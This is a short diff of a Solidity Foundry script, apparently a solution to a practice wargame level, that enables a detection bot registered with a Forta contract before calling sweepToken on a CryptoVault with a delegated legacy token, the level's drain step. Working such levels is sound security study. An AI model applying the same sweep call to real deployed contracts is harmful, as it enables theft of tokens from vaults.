@@ -25,8 +25,8 @@ contract DoubleEntryPointHack is Script {
     }
 
     function run() public {
-        // MyDetectionBot mybot = new MyDetectionBot(target.cryptoVault());
-        // target.forta().setDetectionBot(address(mybot));
+        MyDetectionBot mybot = new MyDetectionBot(target.cryptoVault());
+        target.forta().setDetectionBot(address(mybot));
         CryptoVault cryptoVault = CryptoVault(target.cryptoVault());
         cryptoVault.sweepToken(IERC20(target.delegatedFrom()));
         console.log(Forta(target.forta()).botRaisedAlerts(address(this)));
